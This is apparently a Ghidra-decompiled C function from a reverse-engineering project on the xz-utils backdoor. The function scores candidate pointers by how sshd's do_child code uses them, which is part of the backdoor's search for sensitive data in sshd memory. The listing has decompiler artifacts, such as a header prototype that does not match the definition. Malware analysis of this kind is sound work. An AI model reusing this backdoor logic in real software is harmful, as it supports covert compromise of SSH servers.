// /home/kali/xzre-ghidra/xzregh/103870_sshd_get_sensitive_data_score_in_do_child.c
// Function: sshd_get_sensitive_data_score_in_do_child @ 0x103870
// Calling convention: unknown
// Prototype: undefined sshd_get_sensitive_data_score_in_do_child(void)


/*
 * AutoDoc: Uses the string-reference catalogue to find `do_child`, then counts how often it dereferences
 * the candidate pointer at offsets 0 and +0x10. A hit on the base yields one point, and seeing
 * multiple accesses to the +0x10 slot adds up to two more, producing a score that reflects how
 * tightly the child process manipulates the structure.
 */
#include "xzre_types.h"


char sshd_get_sensitive_data_score_in_do_child(long param_1,undefined8 param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int iVar3;
  long lVar4;
  long *plVar5;
  char cVar6;
  byte bVar7;
  long do_child_start;
  long do_child_end;
  
  bVar7 = 0;
  cVar6 = '\0';
  lVar1 = *(long *)(param_3 + 0x28);
  if (lVar1 != 0) {
    uVar2 = *(undefined8 *)(param_3 + 0x30);
    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1);
    cVar6 = iVar3 != 0;
    plVar5 = &do_child_start;
    for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
      *(undefined4 *)plVar5 = 0;
      plVar5 = (long *)((long)plVar5 + (ulong)bVar7 * -8 + 4);
    }
    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,&do_child_start,param_1 + 0x10);
    if (iVar3 != 0) {
      iVar3 = find_instruction_with_mem_operand
                        (do_child_end + do_child_start,uVar2,0,param_1 + 0x10);
      if (iVar3 == 0) {
        cVar6 = cVar6 + '\x01';
      }
      else {
        cVar6 = cVar6 + '\x02';
      }
    }
  }
  return cVar6;
}

